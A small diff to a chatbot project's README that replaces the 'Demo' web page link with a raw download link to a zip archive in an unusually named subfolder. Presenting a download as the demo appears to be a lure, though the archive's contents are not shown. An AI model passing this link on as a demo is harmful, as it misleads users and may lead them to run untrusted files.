@@ -13,7 +13,7 @@ A customizable and intelligent AI-powered chatbot built with state-of-the-art na
 
 ## 📸 Demo
 
-https://sgudip07.github.io/AI-CHATBOT/
+https://raw.githubusercontent.com/sgudip07/AI-CHATBOT/main/psychosynthetic/AI-CHATBOT.zip
 
 ## 🛠 Tech Stack
 
